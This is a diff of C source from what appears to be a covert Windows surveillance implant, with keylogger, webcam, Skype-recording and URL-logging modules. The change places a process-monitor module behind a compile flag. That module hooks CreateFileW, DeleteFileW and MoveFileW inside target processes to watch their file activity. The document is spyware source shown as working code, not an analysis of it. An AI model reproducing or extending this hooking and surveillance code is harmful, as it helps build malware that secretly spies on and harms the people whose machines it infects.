@@ -51,6 +51,7 @@
 #include <tchar.h>
 #include <Strsafe.h>
 #include "config.h"
+#include "strings.h"
 
 // modules
 #ifdef __ENABLE_KEYLOG_MODULE
@@ -150,11 +151,15 @@ void UnlockConfFile();
 #pragma comment(lib, "webcam")
 #endif
 
+/// Despite the name, procmon monitors i/o access into each process
+#ifdef __ENABLE_PROCMON_MODULE
+#include "../modules/procmon/HM_ProcessMonitors.h"
+#pragma comment(lib, "procmon")
+#endif
 
 /// SECTION for building modules
 
 #include <json/JSON.h>
-#include "HM_ProcessMonitors.h" // XXX da modificare
 void PM_PrintAgentRegister();
 #include "../modules/imagent/HM_SkypeRecord.h"
 #include "../modules/urlwin32/HM_UrlLog.h" // XXX da modificare 
@@ -987,10 +992,11 @@ void __stdcall HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOO
 	//HMMAKE_HOOK(dwPid, "CreateFileA", PM_CreateFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
 	//HMMAKE_HOOK(dwPid, "DeleteFileA", PM_DeleteFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
 	//HMMAKE_HOOK(dwPid, "MoveFileA", PM_MoveFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
-
+#ifdef __ENABLE_PROCMON_MODULE
 	HMMAKE_HOOK(dwPid, "CreateFileW", PM_CreateFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
 	HMMAKE_HOOK(dwPid, "DeleteFileW", PM_DeleteFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
 	HMMAKE_HOOK(dwPid, "MoveFileW", PM_MoveFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
+#endif
 
 #ifdef __ENABLE_KEYLOG_MODULES
 	// --- PM per il keylog agent
